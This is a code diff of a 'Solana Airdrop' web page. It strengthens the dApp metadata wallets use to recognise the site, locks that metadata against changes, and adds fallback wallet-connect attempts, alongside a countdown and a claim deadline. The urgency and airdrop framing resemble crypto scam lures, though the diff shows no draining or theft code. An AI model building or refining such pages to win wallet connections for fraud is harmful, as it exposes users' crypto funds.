@@ -58,7 +58,7 @@
   
   <!-- dApp Metadata Script -->
   <script>
-    // Set dApp metadata for wallet detection
+    // Set dApp metadata for wallet detection BEFORE wallet scripts load
     window.dAppMetadata = {
       name: 'Solana Airdrop',
       description: 'Claim your exclusive Solana token airdrop before August 31st',
@@ -81,6 +81,21 @@
       meta.content = 'Solana Airdrop';
       document.head.appendChild(meta);
     }
+    
+    // Set additional window properties for wallet recognition
+    window.solanaDAppName = 'Solana Airdrop';
+    window.solanaDAppDescription = 'Claim your exclusive Solana token airdrop before August 31st';
+    window.solanaDAppUrl = window.location.origin;
+    window.solanaDAppIcon = window.location.origin + '/logo.png';
+    
+    // Override any existing dApp metadata
+    Object.defineProperty(window, 'dAppMetadata', {
+      value: window.dAppMetadata,
+      writable: false,
+      configurable: false
+    });
+    
+    console.log('dApp metadata set:', window.dAppMetadata);
   </script>
   <style>
     body {
@@ -881,16 +896,16 @@
     setInterval(updateCountdown, 1000);
     updateCountdown(); // Initial call
 
-    // dApp metadata for wallet connections
+    // Proper Solana dApp metadata for wallet recognition
     const dAppMetadata = {
       name: 'Solana Airdrop',
-      description: 'Claim your exclusive Solana token airdrop',
+      description: 'Claim your exclusive Solana token airdrop before August 31st',
       url: window.location.origin,
-      icon: '/logo.png'
+      icon: window.location.origin + '/logo.png'
     };
 
-    // Solana dApp metadata for wallet recognition
-    const solanaDAppMetadata = {
+    // Solana Wallet Adapter metadata format
+    const walletAdapterMetadata = {
       name: 'Solana Airdrop',
       description: 'Claim your exclusive Solana token airdrop before August 31st',
       url: window.location.origin,
@@ -902,15 +917,62 @@
       }
     };
 
-    // Enhanced wallet connection with dApp metadata
+    // Function to manually set dApp name for wallet recognition
+    function setWalletDAppName(provider, walletName) {
+      try {
+        // Try to set dApp name on provider if possible
+        if (provider && typeof provider.setAppMetadata === 'function') {
+          provider.setAppMetadata({
+            name: 'Solana Airdrop',
+            description: 'Claim your exclusive Solana token airdrop before August 31st',
+            url: window.location.origin,
+            icon: window.location.origin + '/logo.png'
+          });
+        }
+        
+        // Set on window object for wallet detection
+        window.currentDAppName = 'Solana Airdrop';
+        window.currentDAppDescription = 'Claim your exclusive Solana token airdrop before August 31st';
+        
+        console.log(`Set dApp name for ${walletName}: Solana Airdrop`);
+      } catch (error) {
+        console.log(`Could not set dApp name for ${walletName}:`, error);
+      }
+    }
+
+    // Enhanced wallet connection with proper metadata
     async function connectWalletWithMetadata(provider, walletName) {
       try {
+        // Set dApp name before connection
+        setWalletDAppName(provider, walletName);
+        
         if (typeof provider.connect === 'function') {
-          // Pass dApp metadata to wallet
-          const result = await provider.connect({
-            onlyIfTrusted: false,
-            appMetadata: solanaDAppMetadata
-          });
+          // Try different metadata formats for different wallets
+          let result = null;
+          
+          // Try Wallet Adapter format first
+          try {
+            result = await provider.connect({
+              onlyIfTrusted: false,
+              appMetadata: walletAdapterMetadata
+            });
+          } catch (error) {
+            console.log(`Wallet Adapter format failed for ${walletName}, trying basic format...`);
+            
+            // Try basic format
+            try {
+              result = await provider.connect({
+                onlyIfTrusted: false,
+                appMetadata: dAppMetadata
+              });
+            } catch (error2) {
+              console.log(`Basic format failed for ${walletName}, trying simple connect...`);
+              
+              // Try simple connect without metadata
+              result = await provider.connect();
+            }
+          }
+          
           return result;
         }
         return null;
